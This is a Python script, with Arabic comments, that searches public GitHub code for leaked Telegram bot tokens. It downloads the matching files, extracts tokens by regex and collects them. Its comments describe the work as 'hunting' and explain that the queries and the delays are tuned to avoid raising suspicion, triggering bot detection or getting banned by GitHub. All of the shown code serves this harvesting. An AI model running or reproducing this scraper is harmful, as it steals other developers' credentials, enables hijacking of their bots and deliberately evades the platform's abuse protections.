import re
import os
import datetime
import time
from github import Github, GithubException

def search_for_tokens():
    token = os.getenv('GITHUB_TOKEN')
    if not token:
        print("[!] GITHUB_TOKEN غير موجود في متغيرات البيئة!")
        return []
        
    print("[*] بدء عملية الصيد الاحترافية...")
    try:
        # استخدام التوكن مع تفعيل خاصية التعامل مع التحديدات
        g = Github(token, timeout=20, per_page=10)
    except Exception as e:
        print(f"[!] خطأ في إنشاء كائن Github: {e}")
        return []

    found_tokens = []
    
    # تحسين الاستعلامات لتجنب الأنماط التي تثير الشكوك
    queries = [
        'filename:main.py "bot_token"',
        'filename:config.py "TOKEN"',
        '"telebot.TeleBot"',
        'telegram_token'
    ]
    
    for query in queries:
        print(f"[>] جاري فحص: {query}")
        try:
            # التحقق من معدل الاستخدام المتبقي قبل كل عملية
            rate_limit = g.get_rate_limit().search
            if rate_limit.remaining == 0:
                reset_time = rate_limit.reset.timestamp() - time.time()
                print(f"[!] تم استهلاك الرصيد، انتظار {int(reset_time)} ثانية...")
                time.sleep(max(reset_time, 60))
            
            results = g.search_code(query=query, sort='indexed', order='desc')
            
            count = 0
            for file in results:
                if count >= 5: break # تقليل العدد لـ 5 نتائج لتجنب الحظر
                try:
                    # تأخير بسيط جداً بين كل ملف وآخر لتجنب كشف البوت
                    time.sleep(2) 
                    content = file.decoded_content.decode('utf-8')
                    matches = re.findall(r'[0-9]{8,15}:[a-zA-Z0-9_-]{35}', content)
                    for token in matches:
                        if token not in found_tokens:
                            found_tokens.append(token)
                            count += 1
                except: continue
            
            print(f"[+] تم استخراج {count} توكن.")
            # تأخير بين كل استعلام والآخر
            time.sleep(15) 
            
        except GithubException as e:
            if e.status == 403:
                print("[!] حظر مؤقت من GitHub (403). انتظار 300 ثانية...")
                time.sleep(300) 
            else:
                print(f"[!] خطأ API: {e}")
        except Exception as e:
            print(f"[!] خطأ عام: {e}")
            
    return found_tokens
